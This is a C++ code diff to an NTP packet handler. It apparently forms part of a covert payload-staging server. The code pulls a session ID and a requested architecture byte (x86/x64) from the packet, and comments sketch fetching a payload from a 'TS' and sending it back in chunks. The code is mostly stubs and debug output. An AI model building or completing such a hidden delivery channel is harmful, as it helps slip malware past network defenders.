@@ -11,6 +11,7 @@
 #include <array>
 #include "client.hpp"
 #include "constants.hpp"
+#include "globals.hpp"
 
 void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET sock) {
     //bug is here, as it was +48 instead of whtaever. Need to get size safely, as well.
@@ -20,10 +21,6 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
     std::cout << "Received " << len << " bytes from "
         << inet_ntoa(client_addr->sin_addr) << ":"
         << ntohs(client_addr->sin_port) << std::endl;
-
-
-    //0.: Extract client ID and stuff out, do class checks to see if it exstsi, and setup for further action
-    //note, size packet may not contain an id
 
     //std::cout << "Theoretical Client ID" << generateClientID() << std::endl;
 
@@ -51,6 +48,14 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
         return;
     }
 
+    //after validateion for stuff
+
+    //Extract client ID and stuff out, do class checks to see if it exstsi, and setup for further action
+    std::vector<uint8_t> sessionId;
+    sessionId.insert(sessionId.begin(), packet.begin() + 4, packet.begin() + 8); //copies between byte 4 and 8, 
+    printHexVector(sessionId); //sanity debug check
+
+
     //Extract extension field
     NTPPacketParser ntpPacket(packet);
     std::vector<uint8_t> ntpPacketExtension = ntpPacket.getExtension();
@@ -64,13 +69,51 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
         std::cout << "----------------------" << std::endl;
         printHexVectorPacket(ntpPacket.getRawPacket());
 
+        //extract arch
+        uint8_t payloadArch = ntpPacketExtension[8];
+        //static cast so it shows up as hex, and not å (whcih is ascii 134 lol)
+        std::cout << "[?] Payload Arch = 0x" << std::hex << static_cast<int>(payloadArch) << std::endl;  // prints 86
+
+        if (payloadArch == 0x86) {
+            std::cout << "[?] X86 Payload Requested " << std::endl;
+        }
+
+        //payloadArch.insert()
+
         //Parse incoming packet for payload arch
         /*
-        0x86/0x64: forward to TS
+        0x86/0x64: forward to TS, get payload
 
-        0x00: Incoming for more of payload. Parse for SessionID for chunker, with client class
+        0x00: Incoming for more of payload. 
         
         */
+
+        /*
+        if packet.extensiondata == 0x86 {
+            //get payload from ts
+        }
+
+        else if packet.extesniondata == 0x64 {
+            //get payload from ts
+        }
+
+
+        else if packet.extensiondata == 0x00 {
+            //check if class exsists for client,
+            if so, access next chunk for cleint
+            client.getNextChunk()
+
+            //create response packet
+            responsePacket = creatResponsePacket
+
+            //and send it
+            sendNtpPacket(responsePacket)
+        }
+
+        
+        */
+        
+
 
         //Then, once you have payload, send back size of payload.
         
